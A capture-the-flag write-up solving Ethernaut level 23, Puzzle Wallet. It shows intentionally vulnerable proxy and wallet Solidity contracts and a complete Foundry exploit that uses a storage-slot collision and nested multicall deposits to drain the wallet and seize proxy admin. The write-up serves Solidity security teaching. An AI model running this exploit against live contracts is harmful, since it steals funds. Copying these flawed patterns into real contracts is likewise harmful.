---
title: 'Ethernaut Challenge #23 Solution — Puzzle Wallet'
excerpt: This is Part 23 of the "Let’s play OpenZeppelin Ethernaut CTF" series, where I will explain how to solve each challenge.</br></br>The goal of this challenge is to be able to become the owner of the proxy contract.
coverImage:
  url: '/assets/blog/ethernaut/puzzle-wallet.svg'
  credit:
    name: OpenZeppelin
    url: https://ethernaut.openzeppelin.com/
date: '2022-08-16T07:00:00.000Z'
author:
  name: Emanuele Ricci
  twitter: StErMi
  picture: '/assets/blog/authors/stermi.jpeg'
ogImage:
  url: '/assets/blog/ethernaut/puzzle-wallet.svg'
---

This is Part 23 of the ["Let’s play OpenZeppelin Ethernaut CTF"](https://stermi.medium.com/lets-play-ethernaut-ctf-learning-solidity-security-while-playing-1678bd6db3c4) series, where I will explain how to solve each challenge.

> [The Ethernaut](https://ethernaut.openzeppelin.com/) is a Web3/Solidity based wargame created by [OpenZeppelin](https://openzeppelin.com/).
> Each level is a smart contract that needs to be 'hacked'. The game acts both as a tool for those interested in learning ethereum, and as a way to catalogue historical hacks in levels. Levels can be infinite and the game does not require to be played in any particular order.

## Challenge #23: Puzzle Wallet

> Nowadays, paying for DeFi operations is impossible, fact.
>
> A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.
>
> They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.
>
> Little did they know, their lunch money was at risk…
>
> You'll need to hijack this wallet to become the admin of the proxy.
>
> Things that might help:
>
> - Understanding how `delegatecall`s work and how `msg.sender` and `msg.value` behaves when performing one.
> - Knowing about proxy patterns and the way they handle storage variables.
>
> Level author(s): [OpenZeppelin](https://openzeppelin.com/)

The goal of this challenge is to be able to become the owner of the proxy contract.

## Study the contracts

Grab a cup of coffee because this challenge will be pretty difficult. We have already dealt with proxies contract, implementation contracts, delegate calls and so on but still, they are complex to understand and even more complex to exploit :D

If you are totally new to the Proxy world, I would highly suggest you to first give a read to all these contents:

- [OpenZeppelin Proxies](https://docs.openzeppelin.com/contracts/4.x/api/proxy)
- [OpenZeppelin Proxy Upgrade Pattern](https://docs.openzeppelin.com/upgrades-plugins/1.x/proxies)
- [OpenZeppelin Transparent vs UUPS Proxies](https://docs.openzeppelin.com/contracts/4.x/api/proxy#transparent-vs-uups)
- [(Video) OpenZeppelin Deploying More Efficient Upgradeable Contracts](https://www.youtube.com/watch?v=kWUDTZhxKZI)
- [(Video) OpenZeppelin # Security in Upgrades of Smart Contracts](https://www.youtube.com/watch?v=5WE6PEc305w&t=3945s)

**⚠️ Important ⚠️** This is just a basic explanation on how proxies work, please do your own research if you need to use them or implement in a real life scenario.

I will try to explain it at a very high level, so bear with me. The idea behind the Proxy/Implementation pattern is to have two different contracts that behave like this:

- The user interact with the Proxy contract, all the "data" are stored here. You can think about this contract as a frontend. The proxy contract will "forward" all the user interaction to the Implementation contract
- All the implementation of the Proxy contract are implemented in the Implementation contract. This allows the Proxy owner to upgrade at some point the "pointer" to the Implementation contract in case he wants to fix bugs or implement new features.

The proxy contract usually does not have much code inside of it (only the one to manage the upgrades/auth) and have a `fallback` function that will "forward" all the user's interaction to the Implementation contract that contains the real implementation of the function. This "forwarding" operation is done via `delegatecall`.

At this point, I would assume that you already know how a `delegatecall` works but if you are new to all of this give a read to this content

- [Solidity Docs: Delegatecall / Callcode and Libraries](https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries)
- [Sigma Prime, Solidity Security: Comprehensive list of known attack vectors and common anti-patterns: delegatecall](https://blog.sigmaprime.io/solidity-security.html#delegatecall)

When `ContractA` calls `ContractB`'s function `implementation()` via `delegatecall` the function is executed on `ContractB` code but the whole **context** (`msg.sender`, `msg.value` and contract's storage) is the one from `ContractA`.

A critical concept to remember is that if `ContractB` code update the contract's storage during a `delegatecall` it will **not modify `ContractB` storage but `ContractA` storage!**

`delegatecall` is a powerful tool, but it's also very complex and dangerous if not used correctly.

With all this explanation in mind, let's see review the contracts

### `PuzzleProxy.sol`

```solidity
contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(
        address _admin,
        address _implementation,
        bytes memory _initData
    ) public UpgradeableProxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}
```

This is the Proxy contract, each user will interact directly with this contract that will forward everything to the `PuzzleWallet` contract via `delegatecall` when the `fallback` function (implemented in `UpgradeableProxy`) is executed.

The `fallback` function is executed only if none of the above function is called.

This contract, other than forwarding the calls, handles the `admin` role that is the role created to "upgrade" the Proxy to a new implementation in case a bug needs to be fixed, or a new feature has to be added to the contract.

Anyone can propose a new admin via `proposeAdmin(address)` but only the current admin can approve the new admin via `approveNewAdmin`.

### `PuzzleWallet.sol`

```solidity
contract PuzzleWallet {
    using SafeMath for uint256;
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] = balances[msg.sender].add(msg.value);
    }

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] = balances[msg.sender].sub(value);
        (bool success, ) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```

It's a pretty long contract, but the important bits are here.

- In order to `execute` a transaction, you must be in the `whitelisted` mapping. You can execute an `execute` call only the `msg.sender` has enough balance (`balances[msg.sender]`) compared to the `value` requested to be sent to the `to`
- A user can be added to the `whitelisted` mapping only by the `owner` of the contract
- Whitelisted users can call `deposit` to deposit ETH to the contract and update their balance
- To pay less gas transactions can be executed in batch via the `multicall` function
- `multicall` function allow only **one** `deposit` call to be added to the list of batched call list. This is done to prevent that someone send X amount of ETH via `multicall` but call multiple times `deposit` inside the list of batched transactions

### Exploiting the contracts

After reviewing the code, have you found at least where some problems are?
I will give you some hints:

- Layout storage of a contract and Proxies
- The context of the contract during the execution of `delegatecall`

Ok, let's go down the rabbit hole.

First, `PuzzleProxy` and `PuzzleWallet` do not have the same layout storage. This mean that when `PuzzleWallet` modify the state variables when it executes some code during a `delegatecall` from `PuzzleProxy` it could inadvertently change the value of the wrong variable.

Let's make an example. I call `PuzzleProxy.proposeNewAdmin(player)` proposing the `player` address as the new admin of the proxy contract. The `proposeNewAdmin` function update the `pendingAdmin` variable that is located in the **Slot 0** of the `PuzzleProxy`.

Do you know what is located in the **Slot 0** of the `PuzzleWallet` contract? The `address public owner` variable! Do you know what does it mean? This mean that when `PuzzleWallet` functions are executed via `delegatecall` from `PuzzleProxy` the `pendingAdmin` is now the `owner`!

So now we are the `owner` of the `PuzzleWallet` but our end goal is to become the `admin` of the `PuzzleProxy`.
We could leverage the same exploit, and to do so we must find a way to let the `PuzzleWallet` modify the **Slot 1** of the layout storage when a `delegatecall` is executed.

On **Slot 1** of the `PuzzleWallet` contract, there is the `maxBalance` variable. We just need to update that value by casting the Player address to an integer via `uint256(player)`.

The only function that modify that variable is `setMaxBalance` that can be called only by a **whitelisted** user and when the balance of the contract is 0.

We are now the owner of the contract (thanks to the exploit) so we can add ourselves to the whitelisted list by calling `addToWhitelist` but we need still solve the balance problem.

Can we now finally call `setMaxBalance(uint256(player))`? **Nope!**

```solidity
function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
    require(address(this).balance == 0, "Contract balance is not 0");
    maxBalance = _maxBalance;
}
```

If you look at the code, the transaction will revert if there are any balances inside the contract and the contract was funded with `0.001 ether` at deployment side by the deployer.

To finish the challenge and become the `admin` of the Proxy, we must drain the contract by calling `execute` and making it use that `0.001 ether` balance. The problem is that execute will only use the balance of the user if it's equal to `msg.sender` and there's no way we can exploit that mechanism.

We can't rely on `deposit` because even if we deposit something and then call `execute` we couldn't use more than what we have deposited. So, now what?

Let's look at the `multicall` function code and see if there's something we can exploit over there

```solidity
function multicall(bytes[] calldata data) external payable onlyWhitelisted {
    bool depositCalled = false;
    for (uint256 i = 0; i < data.length; i++) {
        bytes memory _data = data[i];
        bytes4 selector;
        assembly {
            selector := mload(add(_data, 32))
        }
        if (selector == this.deposit.selector) {
            require(!depositCalled, "Deposit can only be called once");
            // Protect against reusing msg.value
            depositCalled = true;
        }
        (bool success, ) = address(this).delegatecall(data[i]);
        require(success, "Error while delegating call");
    }
}
```

The function allows the user to batch together multiple calls to spare some gas and as you can see has a check to allow only one `deposit` inside the batched calls. This check is needed to prevent someone to add more than one `deposit` while sending some ether. Without that check, you would be able to double account for the ether sent.

For example, if I sent `1 ether` and have two deposits, at the end of the transaction, the `balances[msg.sender]` would be equal to `2 ether` while I've sent only `1 ether`.

So, how can we exploit this? While it's true that we can't have two deposits inside of one `multicall`, what if we can batch one `deposit` and then another `deposit` inside another `multicall`?

A **multicall-inception!**

![Mind Blown Explosion](/assets/blog/mind-blown-explosion.gif)

Let's prepare the `multicall` call

```solidity
bytes[] memory callsDeep = new bytes[](1);
callsDeep[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);

bytes[] memory calls = new bytes[](2);
calls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
calls[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, callsDeep);
puzzleWallet.multicall{value: 0.001 ether}(calls);

// At this point inside the contract there are 0.002 ether (one is from us and one from the PuzzleWalletFactory)
// But `balances[player]` is equal to 0.002 ether!
// We are able to call the `execute` method in a way that will send to us the whole contract's balance
puzzleWallet.execute(player, 0.002 ether, "");
```

After the `execute` we have successfully removed all the ether balance from the contract (and gained `0.001` free ether) and we can call `puzzleWallet.setMaxBalance(uint256(player));`

By doing that, we are now **the admin of the `PuzzleProxy` contract!**

## Solution code

Let's recap what we need to do to solve the challenge

1. Call `proposeNewAdmin(player)` to become the owner of the `PuzzleWallet` when called via `delegatecall`
2. Now that we are the owner (when the `PuzzleWallet` is accessed via `delegatecall`) we can add ourselves to the list of whitelisted users via `addToWhitelist(player);`
3. Build a batched calls payload to be able to deposit `0.001 ether` but make the contract account us for `0.002 ether` in our balance. See the explanation above for more details
4. Execute the multicall, now the `PuzzleWallet` has no more ether inside of it
5. Call `setMaxBalance(uint256(player));` to become the `admin` of the `PuzzleProxy`

Here's the code of the test used to solve the challenge

```solidity
function exploitLevel() internal override {
    vm.startPrank(player, player);

    // Exploit the contract to become the owner of `PuzzleWallet`
    level.proposeNewAdmin(player);

    // Now that we are the admin, add ourself to the whitelisted user list
    // to be able to deposit, execute and multicall
    puzzleWallet.addToWhitelist(player);

    // Build the payload to drain the wallet and be able to call `setMaxBalance`
    bytes[] memory callsDeep = new bytes[](1);
    callsDeep[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);

    bytes[] memory calls = new bytes[](2);
    calls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
    calls[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, callsDeep);
    puzzleWallet.multicall{value: 0.001 ether}(calls);

    // Execute the batched calls payload
    puzzleWallet.execute(player, 0.002 ether, "");

    // Become the admin of the `PuzzleProxy`
    puzzleWallet.setMaxBalance(uint256(player));

    // Assert that we have completed the challenge
    assertEq(level.admin(), player);

    vm.stopPrank();
}
```

You can read the full solution of the challenge opening [PuzzleWallet.t.sol](https://github.com/StErMi/foundry-ethernaut/blob/main/test/PuzzleWallet.t.sol)

## Further reading

- [Solidity Docs: fallback function](https://docs.soliditylang.org/en/latest/contracts.html#fallback-function)
- [solidity-by-example: fallback function](https://solidity-by-example.org/fallback)
- [Solidity Docs: Delegatecall / Callcode and Libraries](https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries)
- [SWC-112: Delegatecall to Untrusted Callee](https://swcregistry.io/docs/SWC-112)
- [Sigma Prime, Solidity Security: Comprehensive list of known attack vectors and common anti-patterns: delegatecall](https://blog.sigmaprime.io/solidity-security.html#delegatecall)
- [OpenZeppelin Proxy](https://docs.openzeppelin.com/upgrades-plugins/1.x/proxies)

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

I **do not give any warranties** and **will not be liable for any loss** incurred through any use of this codebase.

**DO NOT USE IN PRODUCTION**.
